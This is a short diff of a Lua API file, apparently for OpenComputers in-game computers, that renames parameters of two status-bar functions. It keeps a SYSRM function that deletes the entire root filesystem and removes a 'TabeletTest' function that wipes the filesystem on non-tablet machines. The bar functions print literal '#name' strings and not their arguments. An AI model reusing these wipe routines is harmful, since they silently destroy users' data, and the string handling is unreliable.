@@ -63,39 +63,18 @@ function MAYNERAPI.SYSRM()
     fs.remove("/")
 end
 
-function MAYNERAPI.TopBar(name)
+function MAYNERAPI.TopBar(nametp)
     gpu.setBackground(0xFFFFFF)
     gpu.setForeground(0x000000)
     gpu.fill(1, 1, 1, 1, " ")
-    gpu.set(1, 1, "#name")
+    gpu.set(1, 1, "#nametp")
 end
 
-function MAYNERAPI.DownBar(name)
+function MAYNERAPI.DownBar(namedp)
     gpu.setBackground(0xFFFFFF)
     gpu.setForeground(0x000000)
     gpu.fill(1, 1, 80, 1, " ")
-    gpu.set(1, 1, "#name")
-end
-
-function MAYNERAPI.TabeletTest()
-    
-local function isTablet()
-  if component.isAvailable("tablet") then
-    return true
-  else
-    return false
-  end
-end
-
-if isTablet() then
-  
-else
-  if component.isAvailable("computer") then
-    fs.remove("/")
-  else
-    computer.shutdown()
-  end
-end
+    gpu.set(1, 1, "#namedp")
 end
 
 return MAYNERAPI
